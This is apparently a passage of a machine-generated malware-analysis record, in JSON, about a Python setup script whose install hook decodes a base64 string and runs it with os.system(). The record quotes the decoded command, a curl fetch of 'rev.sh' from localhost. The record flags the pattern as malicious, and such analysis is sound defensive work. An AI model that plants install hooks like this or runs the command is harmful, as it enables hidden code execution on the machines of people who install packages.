{
  "purpose": "To define a Python package setup with custom install and develop commands that execute a decoded base64-encoded script during installation.",
  "sources": "The base64-encoded string in notmalfunc() that is decoded and executed via os.system()",
  "sinks": "The decoded code is executed through os.system(), which executes a command fetched from the base64 string",
  "flows": "The base64 string is decoded in notmalfunc(), then passed to os.system() for execution",
  "anomalies": "Use of base64 decoding to hide the command, and execution of code via os.system() in a setup script, which is uncommon and suspicious",
  "analysis": "The script imports setup tools and defines a function to decode base64-encoded code. The notmalfunc() function decodes a base64 string and executes it via os.system(). The setup script customizes the install and develop commands, with the latter doing nothing and the former executing notmalfunc() during installation. The base64 string decodes to 'curl http://localhost/rev.sh', indicating a potential remote script download. This behavior suggests malicious intent, possibly attempting to execute remote code during installation, which is a security concern. The use of base64 encoding and runtime execution increases suspicion, as these are common obfuscation tactics in malicious packages.",
  "conclusion": "The code is designed to run a decoded command during installation, which appears to be a remote script fetch. This behavior is highly suspicious and indicates malicious intent, as it could lead to remote code execution. The package is attempting to conceal its malicious activity using base64 encoding and dynamic command execution.",
